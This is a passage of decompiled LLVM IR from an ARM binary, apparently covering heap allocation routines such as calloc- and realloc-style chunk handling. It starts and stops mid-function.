  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 6, 4, 30, 5, 7, 8, 9, 22, 13, 10, 23, 11, 12, 15, 14, 20, 16, 24, 19, 18, 25, 21, 17, 27, 26, 28, 1, 29, 31, 36, 32, 33, 3, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 0, 50, 51, 52, 53, 2, 54, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_13b14, { 1, 0 }
  uselistorder i32 (i32)* @function_117b4, { 1, 0 }
  uselistorder label %dec_label_pc_12120, { 1, 0 }
  uselistorder label %dec_label_pc_12104, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12100, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_120f0, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_12084, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12000, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11ff8, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11ecc, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_11e00, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_11cb8, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_11c0c, { 1, 0 }
  uselistorder label %dec_label_pc_11c14.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11bd8, { 1, 0 }
  uselistorder label %dec_label_pc_11b8c, { 1, 0 }
  uselistorder label %dec_label_pc_11b20, { 1, 0 }
  uselistorder label %dec_label_pc_11b1c, { 1, 0 }
  uselistorder label %dec_label_pc_11ac8, { 1, 0 }
  uselistorder label %dec_label_pc_11ab4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a7c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11a68, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_12134(i32 %arg1) local_unnamed_addr {
dec_label_pc_12134:
  %v0_12134 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12134, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_12134
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12134, %bb
  %v10_12148 = phi i32 [ %arg1, %dec_label_pc_12134 ], [ 0, %bb ]
  ret i32 %v10_12148

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_1214c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1214c:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_1214c = load i32, i32* @r4, align 4
  %v6_1214c = load i32, i32* @r5, align 4
  %v9_1214c = load i32, i32* @r6, align 4
  %v12_1214c = load i32, i32* @lr, align 4
  %v2_12154 = icmp eq i32 %arg1, 0
  store i32 add (i32 ptrtoint (i32* @global_var_c624.379 to i32), i32 74080), i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_12164 = mul i32 %arg2, %arg1
  store i32 %v2_12164, i32* @r6, align 4
  br i1 %v2_12154, label %dec_label_pc_12194, label %dec_label_pc_1216c

dec_label_pc_1216c:                               ; preds = %dec_label_pc_1214c
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_12164, i32* @r0, align 4
  %v0_12174 = call i32 @function_10874()
  %v0_12178 = load i32, i32* @r4, align 4
  %v9_12178 = icmp eq i32 %v0_12178, %v0_12174
  br i1 %v9_12178, label %dec_label_pc_1216c.dec_label_pc_12194_crit_edge, label %dec_label_pc_12180

dec_label_pc_1216c.dec_label_pc_12194_crit_edge:  ; preds = %dec_label_pc_1216c
  %v0_12198.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12194

dec_label_pc_12180:                               ; preds = %dec_label_pc_1216c
  %v0_12180 = call i32 @function_11200()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1218c = inttoptr i32 %v0_12180 to i32*
  store i32 12, i32* %v2_1218c, align 4
  br label %dec_label_pc_12258

dec_label_pc_12194:                               ; preds = %dec_label_pc_1216c.dec_label_pc_12194_crit_edge, %dec_label_pc_1214c
  %v0_121b0 = phi i32 [ %v0_12198.pre, %dec_label_pc_1216c.dec_label_pc_12194_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_c624.379 to i32), i32 74080), %dec_label_pc_1214c ]
  %v2_12198 = add i32 %v0_121b0, 68
  %v3_12198 = inttoptr i32 %v2_12198 to i32*
  %v4_12198 = load i32, i32* %v3_12198, align 4
  store i32 %v4_12198, i32* @r4, align 4
  %v2_121b0 = add i32 %v0_121b0, 72
  %v3_121b0 = inttoptr i32 %v2_121b0 to i32*
  %v4_121b0 = load i32, i32* %v3_121b0, align 4
  store i32 %v4_121b0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_121b0)
  %v0_121c4 = load i32, i32* @r5, align 4
  %v2_121c4 = add i32 %v0_121c4, 16
  %v3_121c4 = inttoptr i32 %v2_121c4 to i32*
  %v4_121c4 = load i32, i32* %v3_121c4, align 4
  store i32 %v4_121c4, i32* %ip.global-to-local, align 4
  store i32 74192, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_121c4)
  %v0_121d0 = load i32, i32* @r6, align 4
  store i32 %v0_121d0, i32* @r0, align 4
  %v0_121d4 = call i32 @function_1182c()
  store i32 %v0_121d4, i32* %r4.global-to-local, align 4
  %v2_121d8 = icmp eq i32 %v0_121d4, 0
  br i1 %v2_121d8, label %.thread, label %dec_label_pc_121e0

dec_label_pc_121e0:                               ; preds = %dec_label_pc_12194
  %v1_121e0 = add i32 %v0_121d4, -4
  %v2_121e0 = inttoptr i32 %v1_121e0 to i32*
  %v3_121e0 = load i32, i32* %v2_121e0, align 4
  %v1_121e4 = and i32 %v3_121e0, 2
  %v2_121e4 = icmp eq i32 %v1_121e4, 0
  br i1 %v2_121e4, label %dec_label_pc_121ec, label %.thread

dec_label_pc_121ec:                               ; preds = %dec_label_pc_121e0
  %v1_121ec7 = add i32 %v3_121e0, -4
  %v1_121f0 = and i32 %v1_121ec7, -4
  store i32 %v1_121f0, i32* @r2, align 4
  %v3_121f4 = udiv i32 %v1_121f0, 4
  store i32 %v3_121f4, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_121f0, 36
  %v2_121fc = icmp ult i32 %v1_121f0, 33
  %v3_121fc = or i1 %tmp, %v2_121fc
  br i1 %v3_121fc, label %dec_label_pc_12208, label %dec_label_pc_12200

dec_label_pc_12200:                               ; preds = %dec_label_pc_121ec
  %v2_12200 = inttoptr i32 %v0_121d4 to i8*
  %v3_12200 = call i32 @function_11250(i8* %v2_12200, i32 0)
  br label %.thread

dec_label_pc_12208:                               ; preds = %dec_label_pc_121ec
  %tmp8 = icmp eq i32 %v1_121f0, 16
  %v2_1220c = inttoptr i32 %v0_121d4 to i32*
  store i32 0, i32* %v2_1220c, align 4
  %v1_12210 = load i32, i32* %r4.global-to-local, align 4
  %v2_12210 = add i32 %v1_12210, 4
  %v3_12210 = inttoptr i32 %v2_12210 to i32*
  store i32 0, i32* %v3_12210, align 4
  %v1_12214 = load i32, i32* %r4.global-to-local, align 4
  %v2_12214 = add i32 %v1_12214, 8
  %v3_12214 = inttoptr i32 %v2_12214 to i32*
  store i32 0, i32* %v3_12214, align 4
  %v2_12218 = icmp ult i32 %v1_121f0, 13
  %v3_12218 = or i1 %tmp8, %v2_12218
  br i1 %v3_12218, label %.thread, label %dec_label_pc_1221c

dec_label_pc_1221c:                               ; preds = %dec_label_pc_12208
  %v0_1221c = load i32, i32* %ip.global-to-local, align 4
  %v1_12220 = load i32, i32* %r4.global-to-local, align 4
  %v2_12220 = add i32 %v1_12220, 12
  %v3_12220 = inttoptr i32 %v2_12220 to i32*
  store i32 0, i32* %v3_12220, align 4
  %v1_12224 = load i32, i32* %r4.global-to-local, align 4
  %v2_12224 = add i32 %v1_12224, 16
  %v3_12224 = inttoptr i32 %v2_12224 to i32*
  store i32 0, i32* %v3_12224, align 4
  %tmp9 = icmp ult i32 %v0_1221c, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_1222c

dec_label_pc_1222c:                               ; preds = %dec_label_pc_1221c
  %v0_1222c = load i32, i32* %ip.global-to-local, align 4
  %v7_1222c = icmp eq i32 %v0_1222c, 9
  %v1_12230 = load i32, i32* %r4.global-to-local, align 4
  %v2_12230 = add i32 %v1_12230, 20
  %v3_12230 = inttoptr i32 %v2_12230 to i32*
  store i32 0, i32* %v3_12230, align 4
  %v1_12234 = load i32, i32* %r4.global-to-local, align 4
  %v2_12234 = add i32 %v1_12234, 24
  %v3_12234 = inttoptr i32 %v2_12234 to i32*
  store i32 0, i32* %v3_12234, align 4
  br i1 %v7_1222c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1222c
  %v2_12238 = load i32, i32* %r4.global-to-local, align 4
  %v3_12238 = add i32 %v2_12238, 32
  %v4_12238 = inttoptr i32 %v3_12238 to i32*
  store i32 0, i32* %v4_12238, align 4
  %v2_1223c = load i32, i32* %r4.global-to-local, align 4
  %v3_1223c = add i32 %v2_1223c, 28
  %v4_1223c = inttoptr i32 %v3_1223c to i32*
  store i32 0, i32* %v4_1223c, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1222c, %dec_label_pc_121e0, %dec_label_pc_1221c, %dec_label_pc_12208, %dec_label_pc_12194, %dec_label_pc_12200, %bb
  %v0_1224c = load i32, i32* @r5, align 4
  %v2_1224c = add i32 %v0_1224c, 24
  %v3_1224c = inttoptr i32 %v2_1224c to i32*
  %v4_1224c = load i32, i32* %v3_1224c, align 4
  store i32 %v4_1224c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1224c)
  br label %dec_label_pc_12258

dec_label_pc_12258:                               ; preds = %dec_label_pc_12180, %.thread
  %v0_12258 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1214c, i32* @r4, align 4
  store i32 %v6_1214c, i32* @r5, align 4
  store i32 %v9_1214c, i32* @r6, align 4
  store i32 %v12_1214c, i32* @lr, align 4
  ret i32 %v0_12258

; uselistorder directives
  uselistorder i32 %v1_121f0, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v0_121d4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 33, { 0, 8, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12258, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_1226c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1226c:
  %v0_1226c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1226c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1226c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1226c, %bb
  %v10_1227c = phi i32 [ %arg1, %dec_label_pc_1226c ], [ 0, %bb ]
  ret i32 %v10_1227c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_12280(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12280:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12280 = load i32, i32* @r4, align 4
  %v6_12280 = load i32, i32* @r5, align 4
  %v9_12280 = load i32, i32* @r6, align 4
  %v12_12280 = load i32, i32* @r7, align 4
  %v15_12280 = load i32, i32* @r8, align 4
  %v18_12280 = load i32, i32* @sb, align 4
  %v21_12280 = load i32, i32* @sl, align 4
  %v24_12280 = load i32, i32* @fp, align 4
  %v27_12280 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1228c = icmp eq i32* %arg1, null
  store i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74392), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1228c, label %dec_label_pc_122a0, label %dec_label_pc_122b0

dec_label_pc_122a0:                               ; preds = %dec_label_pc_12280
  store i32 %arg2, i32* @r0, align 4
  %v0_122a4 = call i32 @function_1182c()
  store i32 %v0_122a4, i32* %r0.global-to-local, align 4
  store i32 %v0_122a4, i32* @r4, align 4
  br label %dec_label_pc_12608

dec_label_pc_122b0:                               ; preds = %dec_label_pc_12280
  %v2_122b0 = icmp eq i32 %arg2, 0
  br i1 %v2_122b0, label %dec_label_pc_122b8, label %dec_label_pc_122c4

dec_label_pc_122b8:                               ; preds = %dec_label_pc_122b0
  %v0_122b8 = call i32 @function_12898()
  store i32 %v0_122b8, i32* %r0.global-to-local, align 4
  %v0_122bc = load i32, i32* @r6, align 4
  store i32 %v0_122bc, i32* @r4, align 4
  br label %dec_label_pc_12608

dec_label_pc_122c4:                               ; preds = %dec_label_pc_122b0
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_122cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74460) to i32*), align 4
  store i32 %v4_122cc, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_122cc, i32* %r2.global-to-local, align 4
  %v4_122d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74428) to i32*), align 4
  store i32 %v4_122d8, i32* %r1.global-to-local, align 4
  %v2_122dc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_122dc, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_122e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74464) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_122e4)
  %v0_122f0 = load i32, i32* @r4, align 4
  store i32 %v0_122f0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74392), i32* %r1.global-to-local, align 4
  %v4_122fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74408) to i32*), align 4
  store i32 %v4_122fc, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_12308.391 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_122fc)
  %v0_12308 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_12308, -32
  br i1 %tmp36, label %dec_label_pc_12324, label %dec_label_pc_12310

dec_label_pc_12310:                               ; preds = %dec_label_pc_122c4
  %v0_12310 = call i32 @function_11200()
  store i32 %v0_12310, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1231c = inttoptr i32 %v0_12310 to i32*
  store i32 12, i32* %v2_1231c, align 4
  br label %dec_label_pc_12608

dec_label_pc_12324:                               ; preds = %dec_label_pc_122c4
  %v1_12324 = add i32 %v0_12308, 11
  store i32 %v1_12324, i32* %r0.global-to-local, align 4
  %v0_12328 = load i32, i32* @r5, align 4
  %v1_12328 = add i32 %v0_12328, -4
  %v2_12328 = inttoptr i32 %v1_12328 to i32*
  %v3_12328 = load i32, i32* %v2_12328, align 4
  store i32 %v3_12328, i32* %r2.global-to-local, align 4
  %v2_1232c = icmp ugt i32 %v1_12324, 14
  %v7_1232c = icmp eq i32 %v1_12324, 15
  %v2_12330 = xor i1 %v2_1232c, true
  %v3_12330 = or i1 %v7_1232c, %v2_12330
  br i1 %v3_12330, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_12324
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_12324, %bb
  %v2_12334 = xor i1 %v7_1232c, true
  %v3_12334 = and i1 %v2_1232c, %v2_12334
  br i1 %v3_12334, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_12334 = and i32 %v1_12324, -8
  store i32 %v5_12334, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12338 = and i32 %v3_12328, 2
  %v2_12338 = icmp eq i32 %v1_12338, 0
  %v1_1233c = add i32 %v0_12328, -8
  store i32 %v1_1233c, i32* @sl, align 4
  %v1_12340 = and i32 %v3_12328, -4
  store i32 %v1_12340, i32* @r6, align 4
  br i1 %v2_12338, label %dec_label_pc_12348, label %dec_label_pc_12520

dec_label_pc_12348:                               ; preds = %bb29
  %v1_12348 = load i32, i32* @sb, align 4
  %v3_12348 = icmp ult i32 %v1_12340, %v1_12348
  br i1 %v3_12348, label %dec_label_pc_12354, label %bb30

bb30:                                             ; preds = %dec_label_pc_12348
  store i32 %v1_12340, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124b8

dec_label_pc_12354:                               ; preds = %dec_label_pc_12348
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_1235c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.386 to i32), i32 74424) to i32*), align 4
  store i32 %v4_1235c, i32* %r0.global-to-local, align 4
  %v1_12360 = add i32 %v4_1235c, 44
  %v2_12360 = inttoptr i32 %v1_12360 to i32*
  %v3_12360 = load i32, i32* %v2_12360, align 4
  store i32 %v3_12360, i32* %r3.global-to-local, align 4
  %v2_12364 = add i32 %v1_12340, %v1_1233c
  store i32 %v2_12364, i32* @r4, align 4
  %v9_12368 = icmp eq i32 %v2_12364, %v3_12360
  %v1_1236c = add i32 %v2_12364, 4
  %v2_1236c = inttoptr i32 %v1_1236c to i32*
  %v3_1236c = load i32, i32* %v2_1236c, align 4
  store i32 %v3_1236c, i32* %r1.global-to-local, align 4
  br i1 %v9_12368, label %dec_label_pc_12374, label %dec_label_pc_123b0

dec_label_pc_12374:                               ; preds = %dec_label_pc_12354
  %v1_12374 = and i32 %v3_1236c, -4
  %v2_12378 = add i32 %v1_12374, %v1_12340
  store i32 %v2_12378, i32* %r1.global-to-local, align 4
  %v1_1237c = add i32 %v1_12348, 16
  store i32 %v1_1237c, i32* %r3.global-to-local, align 4
  %v3_12380 = icmp ult i32 %v2_12378, %v1_1237c
  br i1 %v3_12380, label %dec_label_pc_12404, label %dec_label_pc_12388

dec_label_pc_12388:                               ; preds = %dec_label_pc_12374
  %v2_12388 = sub i32 %v2_12378, %v1_12348
  %v1_1238c = urem i32 %v3_12328, 2
  %v2_12390 = add i32 %v1_12348, %v1_1233c
  store i32 %v2_12390, i32* %r1.global-to-local, align 4
  %v2_12394 = or i32 %v1_12348, %v1_1238c
  store i32 %v2_12394, i32* %r2.global-to-local, align 4
  %v1_12398 = or i32 %v2_12388, 1
  store i32 %v1_12398, i32* %r3.global-to-local, align 4
  store i32 %v0_12328, i32* @r4, align 4
  store i32 %v2_12394, i32* %v2_12328, align 4
  %v0_123a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_123a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_123a4 = add i32 %v1_123a4, 44
  %v3_123a4 = inttoptr i32 %v2_123a4 to i32*
  store i32 %v0_123a4, i32* %v3_123a4, align 4
  %v0_123a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_123a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_123a8 = add i32 %v1_123a8, 4
  %v3_123a8 = inttoptr i32 %v2_123a8 to i32*
  store i32 %v0_123a8, i32* %v3_123a8, align 4
  br label %dec_label_pc_125ec

dec_label_pc_123b0:                               ; preds = %dec_label_pc_12354
  %v1_123b0 = and i32 %v3_1236c, -2
  %v2_123b4 = add i32 %v1_123b0, %v2_12364
  store i32 %v2_123b4, i32* %r3.global-to-local, align 4
  %v1_123b8 = add i32 %v2_123b4, 4
  %v2_123b8 = inttoptr i32 %v1_123b8 to i32*
  %v3_123b8 = load i32, i32* %v2_123b8, align 4
  store i32 %v3_123b8, i32* %r3.global-to-local, align 4
  %v1_123bc = urem i32 %v3_123b8, 2
  %v2_123bc = icmp eq i32 %v1_123bc, 0
  br i1 %v2_123bc, label %dec_label_pc_123c4, label %dec_label_pc_12404

dec_label_pc_123c4:                               ; preds = %dec_label_pc_123b0
  %v1_123c4 = and i32 %v3_1236c, -4
  store i32 %v1_123c4, i32* %r3.global-to-local, align 4
  %v2_123c8 = add i32 %v1_123c4, %v1_12340
  store i32 %v2_123c8, i32* %r0.global-to-local, align 4
  %v3_123cc = icmp ult i32 %v2_123c8, %v1_12348
  br i1 %v3_123cc, label %dec_label_pc_12404, label %dec_label_pc_123d4

dec_label_pc_123d4:                               ; preds = %dec_label_pc_123c4
  %v1_123d4 = add i32 %v1_12340, %v0_12328
  %v2_123d4 = inttoptr i32 %v1_123d4 to i32*
  %v3_123d4 = load i32, i32* %v2_123d4, align 4
  store i32 %v3_123d4, i32* %r1.global-to-local, align 4
  %v1_123d8 = add i32 %v3_123d4, 12
  %v2_123d8 = inttoptr i32 %v1_123d8 to i32*
  %v3_123d8 = load i32, i32* %v2_123d8, align 4
  store i32 %v3_123d8, i32* %r3.global-to-local, align 4
  %v9_123dc = icmp eq i32 %v3_123d8, %v2_12364
  %v1_123e0 = add i32 %v2_12364, 12
  %v2_123e0 = inttoptr i32 %v1_123e0 to i32*
  %v3_123e0 = load i32, i32* %v2_123e0, align 4
  store i32 %v3_123e0, i32* %r2.global-to-local, align 4
  br i1 %v9_123dc, label %dec_label_pc_123e8, label %dec_label_pc_123f4

dec_label_pc_123e8:                               ; preds = %dec_label_pc_123d4
  %v1_123e8 = add i32 %v3_123e0, 8
  %v2_123e8 = inttoptr i32 %v1_123e8 to i32*
  %v3_123e8 = load i32, i32* %v2_123e8, align 4
  store i32 %v3_123e8, i32* %r3.global-to-local, align 4
  %v9_123ec = icmp eq i32 %v3_123e8, %v2_12364
  br i1 %v9_123ec, label %dec_label_pc_123f8, label %dec_label_pc_123f4

dec_label_pc_123f4:                               ; preds = %dec_label_pc_123d4, %dec_label_pc_123e8
  %v0_123f4 = call i32 @function_12b14()
  store i32 %v0_123f4, i32* %r0.global-to-local, align 4
  %v0_123f8.pre = load i32, i32* @r1, align 4
  %v1_123f8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_123f8

dec_label_pc_123f8:                               ; preds = %dec_label_pc_123e8, %dec_label_pc_123f4
  %v1_123f8 = phi i32 [ %v3_123e0, %dec_label_pc_123e8 ], [ %v1_123f8.pre, %dec_label_pc_123f4 ]
  %v0_123f8 = phi i32 [ %v3_123d4, %dec_label_pc_123e8 ], [ %v0_123f8.pre, %dec_label_pc_123f4 ]
  %v2_123f8 = add i32 %v1_123f8, 8
  %v3_123f8 = inttoptr i32 %v2_123f8 to i32*
  store i32 %v0_123f8, i32* %v3_123f8, align 4
  %v0_123fc = load i32, i32* %r2.global-to-local, align 4
  %v1_123fc = load i32, i32* %r1.global-to-local, align 4
  %v2_123fc = add i32 %v1_123fc, 12
  %v3_123fc = inttoptr i32 %v2_123fc to i32*
  store i32 %v0_123fc, i32* %v3_123fc, align 4
  %v1_124b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124b8

dec_label_pc_12404:                               ; preds = %dec_label_pc_12374, %dec_label_pc_123c4, %dec_label_pc_123b0
  %v1_12404 = add i32 %v1_12348, -7
  store i32 %v1_12404, i32* @r0, align 4
  %v0_12408 = call i32 @function_1182c()
  store i32 %v0_12408, i32* @r0, align 4
  store i32 %v0_12408, i32* %r1.global-to-local, align 4
  %v2_1240c = icmp eq i32 %v0_12408, 0
  br i1 %v2_1240c, label %bb31, label %dec_label_pc_12418

bb31:                                             ; preds = %dec_label_pc_12404
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_125ec

dec_label_pc_12418:                               ; preds = %dec_label_pc_12404
  %v1_12420.pre = load i32, i32* @r4, align 4
  %v1_12418 = add i32 %v0_12408, -4
  %v2_12418 = inttoptr i32 %v1_12418 to i32*
  %v3_12418 = load i32, i32* %v2_12418, align 4
  store i32 %v3_12418, i32* @r3, align 4
  %v1_1241c = add i32 %v0_12408, -8
  store i32 %v1_1241c, i32* @r7, align 4
  %v9_12420 = icmp eq i32 %v1_1241c, %v1_12420.pre
  br i1 %v9_12420, label %.thread2, label %dec_label_pc_12430

.thread2:                                         ; preds = %dec_label_pc_12418
  %v2_12424 = and i32 %v3_12418, -4
  store i32 %v2_12424, i32* %r3.global-to-local, align 4
  %v2_12428 = load i32, i32* @r6, align 4
  %v3_12428 = add i32 %v2_12428, %v2_12424
  store i32 %v3_12428, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124b8

dec_label_pc_12430:                               ; preds = %dec_label_pc_12418
  %v0_12430 = load i32, i32* @r6, align 4
  %v1_12430 = add i32 %v0_12430, -4
  store i32 %v1_12430, i32* @r2, align 4
  %v3_12434 = udiv i32 %v1_12430, 4
  store i32 %v3_12434, i32* @ip, align 4
  %tmp37 = and i32 %v1_12430, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1243c = icmp ult i32 %v1_12430, 36
  %v3_1243c = or i1 %tmp38, %v2_1243c
  %v0_1244c = load i32, i32* @r5, align 4
  br i1 %v3_1243c, label %dec_label_pc_1244c, label %dec_label_pc_12440

dec_label_pc_12440:                               ; preds = %dec_label_pc_12430
  store i32 %v0_1244c, i32* @r1, align 4
  %v0_12444 = call i32 @function_11300()
  store i32 %v0_12444, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1244c:                               ; preds = %dec_label_pc_12430
  %v1_1244c = inttoptr i32 %v0_1244c to i32*
  %v2_1244c = load i32, i32* %v1_1244c, align 4
  store i32 %v2_1244c, i32* %r3.global-to-local, align 4
  %v2_12450 = inttoptr i32 %v0_12408 to i32*
  store i32 %v2_1244c, i32* %v2_12450, align 4
  %v0_12454 = load i32, i32* @r5, align 4
  %v1_12454 = add i32 %v0_12454, 4
  %v2_12454 = inttoptr i32 %v1_12454 to i32*
  %v3_12454 = load i32, i32* %v2_12454, align 4
  store i32 %v3_12454, i32* %r3.global-to-local, align 4
  %v1_12458 = load i32, i32* %r1.global-to-local, align 4
  %v2_12458 = add i32 %v1_12458, 4
  %v3_12458 = inttoptr i32 %v2_12458 to i32*
  store i32 %v3_12454, i32* %v3_12458, align 4
  %v0_1245c = load i32, i32* @r5, align 4
  %v1_1245c = add i32 %v0_1245c, 8
  %v2_1245c = inttoptr i32 %v1_1245c to i32*
  %v3_1245c = load i32, i32* %v2_1245c, align 4
  store i32 %v3_1245c, i32* %r3.global-to-local, align 4
  %v0_12460 = load i32, i32* @ip, align 4
  %v1_12464 = load i32, i32* %r1.global-to-local, align 4
  %v2_12464 = add i32 %v1_12464, 8
  %v3_12464 = inttoptr i32 %v2_12464 to i32*
  store i32 %v3_1245c, i32* %v3_12464, align 4
  %tmp39 = icmp ult i32 %v0_12460, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1246c

dec_label_pc_1246c:                               ; preds = %dec_label_pc_1244c
  %v0_1246c = load i32, i32* @r5, align 4
  %v1_1246c = add i32 %v0_1246c, 12
  %v2_1246c = inttoptr i32 %v1_1246c to i32*
  %v3_1246c = load i32, i32* %v2_1246c, align 4
  store i32 %v3_1246c, i32* %r3.global-to-local, align 4
  %v1_12470 = load i32, i32* %r1.global-to-local, align 4
  %v2_12470 = add i32 %v1_12470, 12
  %v3_12470 = inttoptr i32 %v2_12470 to i32*
  store i32 %v3_1246c, i32* %v3_12470, align 4
  %v0_12474 = load i32, i32* @r5, align 4
  %v1_12474 = add i32 %v0_12474, 16
  %v2_12474 = inttoptr i32 %v1_12474 to i32*
  %v3_12474 = load i32, i32* %v2_12474, align 4
  store i32 %v3_12474, i32* %r3.global-to-local, align 4
  %v0_12478 = load i32, i32* @ip, align 4
  %v1_1247c = load i32, i32* %r1.global-to-local, align 4
  %v2_1247c = add i32 %v1_1247c, 16
  %v3_1247c = inttoptr i32 %v2_1247c to i32*
  store i32 %v3_12474, i32* %v3_1247c, align 4
  %tmp40 = icmp ult i32 %v0_12478, 7
